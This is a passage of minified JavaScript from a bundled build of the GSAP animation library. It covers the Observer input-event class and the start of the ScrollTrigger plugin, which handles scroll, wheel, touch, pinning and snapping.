              (Xt[0] = Xt[1] = Xt[2] = 0)),
            V &&
              (E && M.deltaY > 0 && E(M),
              S && M.deltaY < 0 && S(M),
              N && N(M),
              X && M.deltaY < 0 != me < 0 && X(M),
              (me = M.deltaY),
              (xt[0] = xt[1] = xt[2] = 0)),
            ($e || ee) && (Y && Y(M), ee && (h(M), (ee = !1)), ($e = !1)),
            Vn && !(Vn = !1) && Wo && Wo(M),
            Yt && (H(M), (Yt = !1)),
            (Wt = 0);
        },
        $i = function (B, D, U) {
          (Xt[U] += B),
            (xt[U] += D),
            M._vx.update(B),
            M._vy.update(D),
            a ? Wt || (Wt = requestAnimationFrame(Er)) : Er();
        },
        li = function (B, D) {
          _t &&
            !vt &&
            ((M.axis = vt = Math.abs(B) > Math.abs(D) ? "x" : "y"), (Vn = !0)),
            "y" !== vt && ((Xt[2] += B), M._vx.update(B, !0)),
            "x" !== vt && ((xt[2] += D), M._vy.update(D, !0)),
            a ? Wt || (Wt = requestAnimationFrame(Er)) : Er();
        },
        ui = function (B) {
          if (!Hn(B, 1)) {
            var D = (B = ls(B, c)).clientX,
              U = B.clientY,
              V = D - M.x,
              G = U - M.y,
              We = M.isDragging;
            (M.x = D),
              (M.y = U),
              (We ||
                Math.abs(M.startX - D) >= o ||
                Math.abs(M.startY - U) >= o) &&
                (h && (ee = !0),
                We || (M.isDragging = !0),
                li(V, G),
                We || (T && T(M)));
          }
        },
        Z = (M.onPress = function (Q) {
          Hn(Q, 1) ||
            (Q && Q.button) ||
            ((M.axis = vt = null),
            cn.pause(),
            (M.isPressed = !0),
            (Q = ls(Q)),
            (nr = me = 0),
            (M.startX = M.x = Q.clientX),
            (M.startY = M.y = Q.clientY),
            M._vx.reset(),
            M._vy.reset(),
            Dt(O ? l : Me, On[1], ui, c, !0),
            (M.deltaX = M.deltaY = 0),
            _ && _(M));
        }),
        rr = (M.onRelease = function (Q) {
          if (!Hn(Q, 1)) {
            kt(O ? l : Me, On[1], ui, !0);
            var B = !isNaN(M.y - M.startY),
              D =
                M.isDragging &&
                (Math.abs(M.x - M.startX) > 3 || Math.abs(M.y - M.startY) > 3),
              U = ls(Q);
            !D &&
              B &&
              (M._vx.reset(),
              M._vy.reset(),
              c &&
                Ne &&
                it.delayedCall(0.08, function () {
                  if (zs() - Xo > 300 && !Q.defaultPrevented)
                    if (Q.target.click) Q.target.click();
                    else if (Me.createEvent) {
                      var V = Me.createEvent("MouseEvents");
                      V.initMouseEvent(
                        "click",
                        !0,
                        !0,
                        tn,
                        1,
                        U.screenX,
                        U.screenY,
                        U.clientX,
                        U.clientY,
                        !1,
                        !1,
                        !1,
                        !1,
                        0,
                        null
                      ),
                        Q.target.dispatchEvent(V);
                    }
                })),
              (M.isDragging = M.isGesturing = M.isPressed = !1),
              p && !O && cn.restart(!0),
              m && D && m(M),
              y && y(M, D);
          }
        }),
        En = function (B) {
          return (
            B.touches &&
            B.touches.length > 1 &&
            (M.isGesturing = !0) &&
            z(B, M.isDragging)
          );
        },
        Pn = function () {
          return (M.isGesturing = !1) || x(M);
        },
        fn = function (B) {
          if (!Hn(B)) {
            var D = kr(),
              U = Cr();
            $i((D - bi) * ze, (U - yt) * ze, 1),
              (bi = D),
              (yt = U),
              p && cn.restart(!0);
          }
        },
        Nn = function (B) {
          if (!Hn(B)) {
            (B = ls(B, c)), H && (Yt = !0);
            var D =
              (1 === B.deltaMode ? u : 2 === B.deltaMode ? tn.innerHeight : 1) *
              v;
            $i(B.deltaX * D, B.deltaY * D, 0), p && !O && cn.restart(!0);
          }
        },
        ai = function (B) {
          if (!Hn(B)) {
            var D = B.clientX,
              U = B.clientY,
              V = D - M.x,
              G = U - M.y;
            (M.x = D), (M.y = U), ($e = !0), (V || G) && li(V, G);
          }
        },
        Wi = function (B) {
          (M.event = B), W(M);
        },
        ir = function (B) {
          (M.event = B), $(M);
        },
        Go = function (B) {
          return Hn(B) || (ls(B, c) && le(M));
        };
      (cn = M._dc =
        it
          .delayedCall(f || 0.25, function () {
            M._vx.reset(), M._vy.reset(), cn.pause(), p && p(M);
          })
          .pause()),
        (M.deltaX = M.deltaY = 0),
        (M._vx = Rf(0, 50, !0)),
        (M._vy = Rf(0, 50, !0)),
        (M.scrollX = kr),
        (M.scrollY = Cr),
        (M.isDragging = M.isGesturing = M.isPressed = !1),
        L1(this),
        (M.enable = function (Q) {
          return (
            M.isEnabled ||
              (Dt(Tr ? Me : l, "scroll", Of),
              s.indexOf("scroll") >= 0 && Dt(Tr ? Me : l, "scroll", fn, c, oe),
              s.indexOf("wheel") >= 0 && Dt(l, "wheel", Nn, c, oe),
              ((s.indexOf("touch") >= 0 && R1) || s.indexOf("pointer") >= 0) &&
                (Dt(l, On[0], Z, c, oe),
                Dt(Me, On[2], rr),
                Dt(Me, On[3], rr),
                Ne && Dt(l, "click", wt, !1, !0),
                le && Dt(l, "click", Go),
                z && Dt(Me, "gesturestart", En),
                x && Dt(Me, "gestureend", Pn),
                W && Dt(l, gi + "enter", Wi),
                $ && Dt(l, gi + "leave", ir),
                Y && Dt(l, gi + "move", ai)),
              (M.isEnabled = !0),
              Q && Q.type && Z(Q),
              ie && ie(M)),
            M
          );
        }),
        (M.disable = function () {
          M.isEnabled &&
            (ho.filter(function (Q) {
              return Q !== M && js(Q.target);
            }).length || kt(Tr ? Me : l, "scroll", Of),
            M.isPressed &&
              (M._vx.reset(), M._vy.reset(), kt(O ? l : Me, On[1], ui, !0)),
            kt(Tr ? Me : l, "scroll", fn, oe),
            kt(l, "wheel", Nn, oe),
            kt(l, On[0], Z, oe),
            kt(Me, On[2], rr),
            kt(Me, On[3], rr),
            kt(l, "click", wt, !0),
            kt(l, "click", Go),
            kt(Me, "gesturestart", En),
            kt(Me, "gestureend", Pn),
            kt(l, gi + "enter", Wi),
            kt(l, gi + "leave", ir),
            kt(l, gi + "move", ai),
            (M.isEnabled = M.isPressed = M.isDragging = !1),
            lt && lt(M));
        }),
        (M.kill = M.revert =
          function () {
            M.disable();
            var Q = ho.indexOf(M);
            Q >= 0 && ho.splice(Q, 1), dr === M && (dr = 0);
          }),
        ho.push(M),
        O && js(l) && (dr = M),
        M.enable(g);
    }),
    iw(t, [
      {
        key: "velocityX",
        get: function () {
          return this._vx.getVelocity();
        },
      },
      {
        key: "velocityY",
        get: function () {
          return this._vy.getVelocity();
        },
      },
    ]),
    t
  );
})();
(Ue.version = "3.11.5"),
  (Ue.create = function (t) {
    return new Ue(t);
  }),
  (Ue.register = A1),
  (Ue.getAll = function () {
    return ho.slice();
  }),
  (Ue.getById = function (t) {
    return ho.filter(function (e) {
      return e.vars.id === t;
    })[0];
  }),
  z1() && it.registerPlugin(Ue);
var A,
  qi,
  te,
  ge,
  jn,
  Te,
  F1,
  ea,
  ta,
  mo,
  du,
  Bl,
  ft,
  Ca,
  Df,
  Tt,
  $h,
  Wh,
  Zi,
  U1,
  cc,
  B1,
  Gt,
  V1,
  H1,
  b1,
  Nr,
  Lf,
  rp,
  fc,
  fl,
  Jt,
  qh,
  Bs,
  Vl = 1,
  Et = Date.now,
  dc = Et(),
  Sn = 0,
  _s = 0,
  sw = function t() {
    return _s && requestAnimationFrame(t);
  },
  Yh = function () {
    return (Ca = 1);
  },
  Xh = function () {
    return (Ca = 0);
  },
  Xn = function (e) {
    return e;
  },
  vs = function (e) {
    return Math.round(1e5 * e) / 1e5 || 0;
  },
  $1 = function () {
    return typeof window < "u";
  },
  W1 = function () {
    return A || ($1() && (A = window.gsap) && A.registerPlugin && A);
  },
  Ii = function (e) {
    return !!~F1.indexOf(e);
  },
  Y1 = function (e) {
    return (
      qr(e, "getBoundingClientRect") ||
      (Ii(e)
        ? function () {
            return (vu.width = te.innerWidth), (vu.height = te.innerHeight), vu;
          }
        : function () {
            return ar(e);
          })
    );
  },
  lw = function (e, n, r) {
    var i = r.d,
      o = r.d2,
      s = r.a;
    return (s = qr(e, "getBoundingClientRect"))
      ? function () {
          return s()[i];
        }
      : function () {
          return (n ? te["inner" + o] : e["client" + o]) || 0;
        };
  },
  uw = function (e, n) {
    return !n || ~er.indexOf(e)
      ? Y1(e)
      : function () {
          return vu;
        };
  },
  Br = function (e, n) {
    var r = n.s,
      i = n.d2,
      o = n.d,
      s = n.a;
    return Math.max(
      0,
      (r = "scroll" + i) && (s = qr(e, r))
        ? s() - Y1(e)()[o]
        : Ii(e)
        ? (jn[r] || Te[r]) -
          (te["inner" + i] || jn["client" + i] || Te["client" + i])
        : e[r] - e["offset" + i]
    );
  },
  Hl = function (e, n) {
    for (var r = 0; r < Zi.length; r += 3)
      (!n || ~n.indexOf(Zi[r + 1])) && e(Zi[r], Zi[r + 1], Zi[r + 2]);
  },
  Dn = function (e) {
    return "string" == typeof e;
  },
  Nt = function (e) {
    return "function" == typeof e;
  },
  ys = function (e) {
    return "number" == typeof e;
  },
  pu = function (e) {
    return "object" == typeof e;
  },
  us = function (e, n, r) {
    return e && e.progress(n ? 0 : 1) && r && e.pause();
  },
  pc = function (e, n) {
    if (e.enabled) {
      var r = n(e);
      r && r.totalTime && (e.callbackAnimation = r);
    }
  },
  Gi = Math.abs,
  X1 = "left",
  Q1 = "top",
  ip = "right",
  op = "bottom",
  Pi = "width",
  Ni = "height",
  Is = "Right",
  As = "Left",
  Fs = "Top",
  Us = "Bottom",
  Re = "padding",
  gn = "margin",
  Vo = "Width",
  sp = "Height",
  tt = "px",
  In = function (e) {
    return te.getComputedStyle(e);
  },
  aw = function (e) {
    var n = In(e).position;
    e.style.position = "absolute" === n || "fixed" === n ? n : "relative";
  },
  Qh = function (e, n) {
    for (var r in n) r in e || (e[r] = n[r]);
    return e;
  },
  ar = function (e, n) {
    var r =
        n &&
        "matrix(1, 0, 0, 1, 0, 0)" !== In(e)[Df] &&
        A.to(e, {
          x: 0,
          y: 0,
          xPercent: 0,
          yPercent: 0,
          rotation: 0,
          rotationX: 0,
          rotationY: 0,
          scale: 1,
          skewX: 0,
          skewY: 0,
        }).progress(1),
      i = e.getBoundingClientRect();
    return r && r.progress(0).kill(), i;
  },
  zf = function (e, n) {
    var r = n.d2;
    return e["offset" + r] || e["client" + r] || 0;
  },
  G1 = function (e) {
    var o,
      n = [],
      r = e.labels,
      i = e.duration();
    for (o in r) n.push(r[o] / i);
    return n;
  },
  cw = function (e) {
    return function (n) {
      return A.utils.snap(G1(e), n);
    };
  },
  lp = function (e) {
    var n = A.utils.snap(e),
      r =
        Array.isArray(e) &&
        e.slice(0).sort(function (i, o) {
          return i - o;
        });
    return r
      ? function (i, o, s) {
          var l;
          if ((void 0 === s && (s = 0.001), !o)) return n(i);
          if (o > 0) {
            for (i -= s, l = 0; l < r.length; l++) if (r[l] >= i) return r[l];
            return r[l - 1];
          }
          for (l = r.length, i += s; l--; ) if (r[l] <= i) return r[l];
          return r[0];
        }
      : function (i, o, s) {
          void 0 === s && (s = 0.001);
          var l = n(i);
          return !o || Math.abs(l - i) < s || l - i < 0 == o < 0
            ? l
            : n(o < 0 ? i - e : i + e);
        };
  },
  fw = function (e) {
    return function (n, r) {
      return lp(G1(e))(n, r.direction);
    };
  },
  bl = function (e, n, r, i) {
    return r.split(",").forEach(function (o) {
      return e(n, o, i);
    });
  },
  Ke = function (e, n, r, i, o) {
    return e.addEventListener(n, r, { passive: !i, capture: !!o });
  },
  Ge = function (e, n, r, i) {
    return e.removeEventListener(n, r, !!i);
  },
  $l = function (e, n, r) {
    (r = r && r.wheelHandler) && (e(n, "wheel", r), e(n, "touchmove", r));
  },
  Gh = {
    startColor: "green",
    endColor: "red",
    indent: 0,
    fontSize: "16px",
    fontWeight: "normal",
  },
  Wl = { toggleActions: "play", anticipatePin: 0 },
  na = { top: 0, left: 0, center: 0.5, bottom: 1, right: 1 },
  hu = function (e, n) {
    if (Dn(e)) {
      var r = e.indexOf("="),
        i = ~r ? +(e.charAt(r - 1) + 1) * parseFloat(e.substr(r + 1)) : 0;
      ~r && (e.indexOf("%") > r && (i *= n / 100), (e = e.substr(0, r - 1))),
        (e =
          i +
          (e in na
            ? na[e] * n
            : ~e.indexOf("%")
            ? (parseFloat(e) * n) / 100
            : parseFloat(e) || 0));
    }
    return e;
  },
  Yl = function (e, n, r, i, o, s, l, u) {
    var a = o.startColor,
      c = o.endColor,
      p = o.fontSize,
      f = o.indent,
      d = o.fontWeight,
      v = ge.createElement("div"),
      g = Ii(r) || "fixed" === qr(r, "pinType"),
      T = -1 !== e.indexOf("scroller"),
      m = g ? Te : r,
      h = -1 !== e.indexOf("start"),
      _ = h ? a : c,
      y =
        "border-color:" +
        _ +
        ";font-size:" +
        p +
        ";color:" +
        _ +
        ";font-weight:" +
        d +
        ";pointer-events:none;white-space:nowrap;font-family:sans-serif,Arial;z-index:1000;padding:4px 8px;border-width:0;border-style:solid;";
    return (
      (y += "position:" + ((T || u) && g ? "fixed;" : "absolute;")),
      (T || u || !g) &&
        (y += (i === He ? ip : op) + ":" + (s + parseFloat(f)) + "px;"),
      l &&
        (y +=
          "box-sizing:border-box;text-align:left;width:" +
          l.offsetWidth +
          "px;"),
      (v._isStart = h),
      v.setAttribute("class", "gsap-marker-" + e + (n ? " marker-" + n : "")),
      (v.style.cssText = y),
      (v.innerText = n || 0 === n ? e + "-" + n : e),
      m.children[0] ? m.insertBefore(v, m.children[0]) : m.appendChild(v),
      (v._offset = v["offset" + i.op.d2]),
      mu(v, 0, i, h),
      v
    );
  },
  mu = function (e, n, r, i) {
    var o = { display: "block" },
      s = r[i ? "os2" : "p2"],
      l = r[i ? "p2" : "os2"];
    (e._isFlipped = i),
      (o[r.a + "Percent"] = i ? -100 : 0),
      (o[r.a] = i ? "1px" : 0),
      (o["border" + s + Vo] = 1),
      (o["border" + l + Vo] = 0),
      (o[r.p] = n + "px"),
      A.set(e, o);
  },
  q = [],
  jf = {},
  Kh = function () {
    return Et() - Sn > 34 && (fl || (fl = requestAnimationFrame(hr)));
  },
  Ki = function () {
    (!Gt || !Gt.isPressed || Gt.startX > Te.clientWidth) &&
      (J.cache++,
      Gt ? fl || (fl = requestAnimationFrame(hr)) : hr(),
      Sn || Fi("scrollStart"),
      (Sn = Et()));
  },
  hc = function () {
    (b1 = te.innerWidth), (H1 = te.innerHeight);
  },
  xs = function () {
    J.cache++,
      !ft &&
        !B1 &&
        !ge.fullscreenElement &&
        !ge.webkitFullscreenElement &&
        (!V1 ||
          b1 !== te.innerWidth ||
          Math.abs(te.innerHeight - H1) > 0.25 * te.innerHeight) &&
        ea.restart(!0);
  },
  Ai = {},
  dw = [],
  K1 = function t() {
    return Ge(b, "scrollEnd", t) || wi(!0);
  },
  Fi = function (e) {
    return (
      (Ai[e] &&
        Ai[e].map(function (n) {
          return n();
        })) ||
      dw
    );
  },
  Kt = [],
  q1 = function (e) {
    for (var n = 0; n < Kt.length; n += 5)
      (!e || (Kt[n + 4] && Kt[n + 4].query === e)) &&
        ((Kt[n].style.cssText = Kt[n + 1]),
        Kt[n].getBBox && Kt[n].setAttribute("transform", Kt[n + 2] || ""),
        (Kt[n + 3].uncache = 1));
  },
  up = function (e, n) {
    var r;
    for (Tt = 0; Tt < q.length; Tt++)
      (r = q[Tt]) && (!n || r._ctx === n) && (e ? r.kill(1) : r.revert(!0, !0));
    n && q1(n), n || Fi("revert");
  },
  Z1 = function (e, n) {
    J.cache++,
      (n || !Jt) &&
        J.forEach(function (r) {
          return Nt(r) && r.cacheID++ && (r.rec = 0);
        }),
      Dn(e) && (te.history.scrollRestoration = rp = e);
  },
  Mi = 0,
  pw = function () {
    if (qh !== Mi) {
      var e = (qh = Mi);
      requestAnimationFrame(function () {
        return e === Mi && wi(!0);
      });
    }
  },
  wi = function (e, n) {
    if (!Sn || e) {
      (Jt = b.isRefreshing = !0),
        J.forEach(function (i) {
          return Nt(i) && i.cacheID++ && (i.rec = i());
        });
      var r = Fi("refreshInit");
      U1 && b.sort(),
        n || up(),
        J.forEach(function (i) {
          Nt(i) && (i.smooth && (i.target.style.scrollBehavior = "auto"), i(0));
        }),
        q.slice(0).forEach(function (i) {
          return i.refresh();
        }),
        q.forEach(function (i, o) {
          if (i._subPinOffset && i.pin) {
            var s = i.vars.horizontal ? "offsetWidth" : "offsetHeight",
              l = i.pin[s];
            i.revert(!0, 1), i.adjustPinSpacing(i.pin[s] - l), i.refresh();
          }
        }),
        q.forEach(function (i) {
          return (
            "max" === i.vars.end &&
            i.setPositions(
              i.start,
              Math.max(i.start + 1, Br(i.scroller, i._dir))
            )
          );
        }),
        r.forEach(function (i) {
          return i && i.render && i.render(-1);
        }),
        J.forEach(function (i) {
          Nt(i) &&
            (i.smooth &&
              requestAnimationFrame(function () {
                return (i.target.style.scrollBehavior = "smooth");
              }),
            i.rec && i(i.rec));
        }),
        Z1(rp, 1),
        ea.pause(),
        Mi++,
        (Jt = 2),
        hr(2),
        q.forEach(function (i) {
          return Nt(i.vars.onRefresh) && i.vars.onRefresh(i);
        }),
        (Jt = b.isRefreshing = !1),
        Fi("refresh");
    } else Ke(b, "scrollEnd", K1);
  },
  If = 0,
  gu = 1,
  hr = function (e) {
    if (!Jt || 2 === e) {
      (b.isUpdating = !0), Bs && Bs.update(0);
      var n = q.length,
        r = Et(),
        i = r - dc >= 50,
        o = n && q[0].scroll();
      if (
        ((gu = If > o ? -1 : 1),
        Jt || (If = o),
        i &&
          (Sn && !Ca && r - Sn > 200 && ((Sn = 0), Fi("scrollEnd")),
          (du = dc),
          (dc = r)),
        gu < 0)
      ) {
        for (Tt = n; Tt-- > 0; ) q[Tt] && q[Tt].update(0, i);
        gu = 1;
      } else for (Tt = 0; Tt < n; Tt++) q[Tt] && q[Tt].update(0, i);
      b.isUpdating = !1;
    }
    fl = 0;
  },
  Af = [
    X1,
    Q1,
    op,
    ip,
    gn + Us,
    gn + Is,
    gn + Fs,
    gn + As,
    "display",
    "flexShrink",
    "float",
    "zIndex",
    "gridColumnStart",
    "gridColumnEnd",
    "gridRowStart",
    "gridRowEnd",
    "gridArea",
    "justifySelf",
    "alignSelf",
    "placeSelf",
    "order",
  ],
  _u = Af.concat([
    Pi,
    Ni,
    "boxSizing",
    "max" + Vo,
    "max" + sp,
    "position",
    gn,
    Re,
    Re + Fs,
    Re + Is,
    Re + Us,
    Re + As,
  ]),
  hw = function (e, n, r) {
    Eo(r);
    var i = e._gsap;
    if (i.spacerIsNative) Eo(i.spacerState);
    else if (e._gsap.swappedIn) {
      var o = n.parentNode;
      o && (o.insertBefore(e, n), o.removeChild(n));
    }
    e._gsap.swappedIn = !1;
  },
  mc = function (e, n, r, i) {
    if (!e._gsap.swappedIn) {
      for (var u, o = Af.length, s = n.style, l = e.style; o--; )
        s[(u = Af[o])] = r[u];
      (s.position = "absolute" === r.position ? "absolute" : "relative"),
        "inline" === r.display && (s.display = "inline-block"),
        (l[op] = l[ip] = "auto"),
        (s.flexBasis = r.flexBasis || "auto"),
        (s.overflow = "visible"),
        (s.boxSizing = "border-box"),
        (s[Pi] = zf(e, Pt) + tt),
        (s[Ni] = zf(e, He) + tt),
        (s[Re] = l[gn] = l[Q1] = l[X1] = "0"),
        Eo(i),
        (l[Pi] = l["max" + Vo] = r[Pi]),
        (l[Ni] = l["max" + sp] = r[Ni]),
        (l[Re] = r[Re]),
        e.parentNode !== n &&
          (e.parentNode.insertBefore(n, e), n.appendChild(e)),
        (e._gsap.swappedIn = !0);
    }
  },
  mw = /([A-Z])/g,
  Eo = function (e) {
    if (e) {
      var o,
        s,
        n = e.t.style,
        r = e.length,
        i = 0;
      for ((e.t._gsap || A.core.getCache(e.t)).uncache = 1; i < r; i += 2)
        (s = e[i + 1]),
          (o = e[i]),
          s
            ? (n[o] = s)
            : n[o] && n.removeProperty(o.replace(mw, "-$1").toLowerCase());
    }
  },
  Xl = function (e) {
    for (var n = _u.length, r = e.style, i = [], o = 0; o < n; o++)
      i.push(_u[o], r[_u[o]]);
    return (i.t = e), i;
  },
  gw = function (e, n, r) {
    for (var l, i = [], o = e.length, s = r ? 8 : 0; s < o; s += 2)
      (l = e[s]), i.push(l, l in n ? n[l] : e[s + 1]);
    return (i.t = e.t), i;
  },
  vu = { left: 0, top: 0 },
  Zh = function (e, n, r, i, o, s, l, u, a, c, p, f, d) {
    Nt(e) && (e = e(u)),
      Dn(e) &&
        "max" === e.substr(0, 3) &&
        (e = f + ("=" === e.charAt(4) ? hu("0" + e.substr(3), r) : 0));
    var g,
      T,
      m,
      v = d ? d.time() : 0;
    if ((d && d.seek(0), ys(e)))
      d &&
        (e = A.utils.mapRange(
          d.scrollTrigger.start,
          d.scrollTrigger.end,
          0,
          f,
          e
        )),
        l && mu(l, r, i, !0);
    else {
      Nt(n) && (n = n(u));
      var _,
        y,
        C,
        k,
        h = (e || "0").split(" ");
      (m = Lt(n) || Te),
        (!(_ = ar(m) || {}) || (!_.left && !_.top)) &&
          "none" === In(m).display &&
          ((k = m.style.display),
          (m.style.display = "block"),
          (_ = ar(m)),
          k ? (m.style.display = k) : m.style.removeProperty("display")),
        (y = hu(h[0], _[i.d])),
        (C = hu(h[1] || "0", r)),
        (e = _[i.p] - a[i.p] - c + y + o - C),
        l && mu(l, C, i, r - C < 20 || (l._isStart && C > 20)),
        (r -= r - C);
    }
    if (s) {
      var S = e + r,
        E = s._isStart;
      (g = "scroll" + i.d2),
        mu(
          s,
          S,
          i,
          (E && S > 20) ||
            (!E && (p ? Math.max(Te[g], jn[g]) : s.parentNode[g]) <= S + 1)
        ),
        p &&
          ((a = ar(l)),
          p && (s.style[i.op.p] = a[i.op.p] - i.op.m - s._offset + tt));
    }
    return (
      d &&
        m &&
        ((g = ar(m)),
        d.seek(f),
        (T = ar(m)),
        (d._caScrollDist = g[i.p] - T[i.p]),
        (e = (e / d._caScrollDist) * f)),
      d && d.seek(v),
      d ? e : Math.round(e)
    );
  },
  _w = /(webkit|moz|length|cssText|inset)/i,
  Jh = function (e, n, r, i) {
    if (e.parentNode !== n) {
      var s,
        l,
        o = e.style;
      if (n === Te) {
        for (s in ((e._stOrig = o.cssText), (l = In(e))))
          !+s &&
            !_w.test(s) &&
            l[s] &&
            "string" == typeof o[s] &&
            "0" !== s &&
            (o[s] = l[s]);
        (o.top = r), (o.left = i);
      } else o.cssText = e._stOrig;
      (A.core.getCache(e).uncache = 1), n.appendChild(e);
    }
  },
  J1 = function (e, n, r) {
    var i = n,
      o = i;
    return function (s) {
      var l = Math.round(e());
      return (
        l !== i &&
          l !== o &&
          Math.abs(l - i) > 3 &&
          Math.abs(l - o) > 3 &&
          ((s = l), r && r()),
        (o = i),
        (i = s),
        s
      );
    };
  },
  e0 = function (e, n) {
    var r = ni(e, n),
      i = "_scroll" + n.p2,
      o = function s(l, u, a, c, p) {
        var f = s.tween,
          d = u.onComplete,
          v = {};
        a = a || r();
        var g = J1(r, a, function () {
          f.kill(), (s.tween = 0);
        });
        return (
          (p = (c && p) || 0),
          (c = c || l - a),
          f && f.kill(),
          (u[i] = l),
          (u.modifiers = v),
          (v[i] = function () {
            return g(a + c * f.ratio + p * f.ratio * f.ratio);
          }),
          (u.onUpdate = function () {
            J.cache++, hr();
          }),
          (u.onComplete = function () {
            (s.tween = 0), d && d.call(f);
          }),
          (f = s.tween = A.to(e, u))
        );
      };
    return (
      (e[i] = r),
      (r.wheelHandler = function () {
        return o.tween && o.tween.kill() && (o.tween = 0);
      }),
      Ke(e, "wheel", r.wheelHandler),
      b.isTouch && Ke(e, "touchmove", r.wheelHandler),
      o
    );
  },
  b = (function () {
    function t(n, r) {
      qi ||
        t.register(A) ||
        console.warn("Please gsap.registerPlugin(ScrollTrigger)"),
        this.init(n, r);
    }
    return (
      (t.prototype.init = function (r, i) {
        if (
          ((this.progress = this.start = 0), this.vars && this.kill(!0, !0), _s)
        ) {
          var Ne,
            _t,
            Wo,
            Wt,
            cn,
            ee,
            $e,
            Yt,
            Vn,
            vt,
            M,
            nr,
            me,
            kr,
            Cr,
            bi,
            yt,
            Yo,
            Tr,
            Me,
            Xt,
            xt,
            Xo,
            wt,
            Hn,
            Qo,
            Er,
            $i,
            li,
            ui,
            Z,
            rr,
            En,
            Pn,
            fn,
            Nn,
            ai,
            Wi,
            ir,
            o = (r = Qh(Dn(r) || ys(r) || r.nodeType ? { trigger: r } : r, Wl)),
            s = o.onUpdate,
            l = o.toggleClass,
            u = o.id,
            a = o.onToggle,
            c = o.onRefresh,
            p = o.scrub,
            f = o.trigger,
            d = o.pin,
            v = o.pinSpacing,
            g = o.invalidateOnRefresh,
            T = o.anticipatePin,
            m = o.onScrubComplete,
            h = o.onSnapComplete,
            _ = o.once,
            y = o.snap,
            C = o.pinReparent,
            k = o.pinSpacer,
            S = o.containerAnimation,
            E = o.fastScrollEnd,
            P = o.preventOverlaps,
            N =
              r.horizontal || (r.containerAnimation && !1 !== r.horizontal)
                ? Pt
                : He,
            I = !p && 0 !== p,
            L = Lt(r.scroller || te),
            X = A.core.getCache(L),
            W = Ii(L),
            $ =
              "fixed" ===
              ("pinType" in r ? r.pinType : qr(L, "pinType") || (W && "fixed")),
            Y = [r.onEnter, r.onLeave, r.onEnterBack, r.onLeaveBack],
            F = I && r.toggleActions.split(" "),
            O = "markers" in r ? r.markers : Wl.markers,
            z = W ? 0 : parseFloat(In(L)["border" + N.p2 + Vo]) || 0,
            x = this,
            H =
              r.onRefreshInit &&
              function () {
                return r.onRefreshInit(x);
              },
            ie = lw(L, W, N),
            lt = uw(L, W),
            le = 0,
            ze = 0,
            oe = ni(L, N);
          if (
            (Lf(x),
            (x._dir = N),
            (T *= 45),
            (x.scroller = L),
            (x.scroll = S ? S.time.bind(S) : oe),
            (Wt = oe()),
            (x.vars = r),
            (i = i || r.animation),
            "refreshPriority" in r &&
              ((U1 = 1), -9999 === r.refreshPriority && (Bs = x)),
            (X.tweenScroll = X.tweenScroll || {
              top: e0(L, He),
              left: e0(L, Pt),
            }),
            (x.tweenTo = Ne = X.tweenScroll[N.p]),
            (x.scrubDuration = function (D) {
              (rr = ys(D) && D)
                ? Z
                  ? Z.duration(D)
                  : (Z = A.to(i, {
                      ease: "expo",
                      totalProgress: "+=0.001",
                      duration: rr,
                      paused: !0,
                      onComplete: function () {
                        return m && m(x);
                      },
                    }))
                : (Z && Z.progress(1).kill(), (Z = 0));
            }),
            i &&
              ((i.vars.lazy = !1),
              i._initted ||
                (!1 !== i.vars.immediateRender &&
                  !1 !== r.immediateRender &&
                  i.duration() &&
                  i.render(0, !0, !0)),
              (x.animation = i.pause()),
              (i.scrollTrigger = x),
              x.scrubDuration(p),
              Z && Z.resetTo && Z.resetTo("totalProgress", 0),
              (li = 0),
              u || (u = i.vars.id)),
            q.push(x),
            y &&
              ((!pu(y) || y.push) && (y = { snapTo: y }),
              "scrollBehavior" in Te.style &&
                A.set(W ? [Te, jn] : L, { scrollBehavior: "auto" }),
              J.forEach(function (D) {
                return (
                  Nt(D) &&
                  D.target === (W ? ge.scrollingElement || jn : L) &&
                  (D.smooth = !1)
                );
              }),
              (Wo = Nt(y.snapTo)
                ? y.snapTo
                : "labels" === y.snapTo
                ? cw(i)
                : "labelsDirectional" === y.snapTo
                ? fw(i)
                : !1 !== y.directional
                ? function (D, U) {
                    return lp(y.snapTo)(D, Et() - ze < 500 ? 0 : U.direction);
                  }
                : A.utils.snap(y.snapTo)),
              (En = y.duration || { min: 0.1, max: 2 }),
              (En = pu(En) ? mo(En.min, En.max) : mo(En, En)),
              (Pn = A.delayedCall(y.delay || rr / 2 || 0.1, function () {
                var D = oe(),
                  U = Et() - ze < 500,
                  V = Ne.tween;
                if (
                  !(U || Math.abs(x.getVelocity()) < 10) ||
                  V ||
                  Ca ||
                  le === D
                )
                  x.isActive && le !== D && Pn.restart(!0);
                else {
                  var G = (D - ee) / me,
                    We = i && !I ? i.totalProgress() : G,
                    ue = U ? 0 : ((We - ui) / (Et() - du)) * 1e3 || 0,
                    ve = A.utils.clamp(-G, 1 - G, (Gi(ue / 2) * ue) / 0.185),
                    et = G + (!1 === y.inertia ? 0 : ve),
                    Ye = mo(0, 1, Wo(et, x)),
                    je = Math.round(ee + Ye * me),
                    ye = y,
                    Qt = ye.onStart,
                    St = ye.onInterrupt,
                    Xe = ye.onComplete;
                  if (D <= $e && D >= ee && je !== D) {
                    if (V && !V._initted && V.data <= Gi(je - D)) return;
                    !1 === y.inertia && (ve = Ye - G),
                      Ne(
                        je,
                        {
                          duration: En(
                            Gi(
                              (0.185 * Math.max(Gi(et - We), Gi(Ye - We))) /
                                ue /
                                0.05 || 0
                            )
                          ),
                          ease: y.ease || "power3",
                          data: Gi(je - D),
                          onInterrupt: function () {
                            return Pn.restart(!0) && St && St(x);
                          },
                          onComplete: function () {
                            x.update(),
                              (le = oe()),
                              (li = ui =
                                i && !I ? i.totalProgress() : x.progress),
                              h && h(x),
                              Xe && Xe(x);
                          },
                        },
                        D,
                        ve * me,
                        je - D - ve * me
                      ),
                      Qt && Qt(x, Ne.tween);
                  }
                }
              }).pause())),
            u && (jf[u] = x),
            (ir =
              (f = x.trigger = Lt(f || d)) && f._gsap && f._gsap.stRevert) &&
              (ir = ir(x)),
            (d = !0 === d ? f : Lt(d)),
            Dn(l) && (l = { targets: f, className: l }),
            d &&
              (!1 === v ||
                v === gn ||
                (v =
                  !(
                    !v &&
                    d.parentNode &&
                    d.parentNode.style &&
                    "flex" === In(d.parentNode).display
                  ) && Re),
              (x.pin = d),
              (_t = A.core.getCache(d)).spacer
                ? (kr = _t.pinState)
                : (k &&
                    ((k = Lt(k)) &&
                      !k.nodeType &&
                      (k = k.current || k.nativeElement),
                    (_t.spacerIsNative = !!k),
                    k && (_t.spacerState = Xl(k))),
                  (_t.spacer = yt = k || ge.createElement("div")),
                  yt.classList.add("pin-spacer"),
                  u && yt.classList.add("pin-spacer-" + u),
